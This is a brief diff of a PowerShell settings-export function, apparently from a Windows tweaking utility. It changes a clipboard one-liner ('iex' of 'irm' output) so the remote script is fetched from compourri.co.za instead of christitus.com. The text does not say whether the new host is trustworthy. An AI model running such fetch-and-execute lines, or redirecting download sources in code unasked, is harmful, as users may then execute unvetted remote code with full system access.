@@ -47,7 +47,7 @@ function Invoke-WPFImpex {
                     $allConfs = $sync.selectedApps + $sync.selectedTweaks + $sync.selectedToggles + $sync.selectedFeatures
                     $jsonFile = $allConfs | ConvertTo-Json
                     $jsonFile | Out-File $Config -Force
-                    "iex ""& { `$(irm https://christitus.com/win) } -Config '$Config'""" | Set-Clipboard
+                    "iex ""& { `$(irm https://compourri.co.za/essentials) } -Config '$Config'""" | Set-Clipboard
                 }
             } catch {
                 Write-Error "An error occurred while exporting: $_"
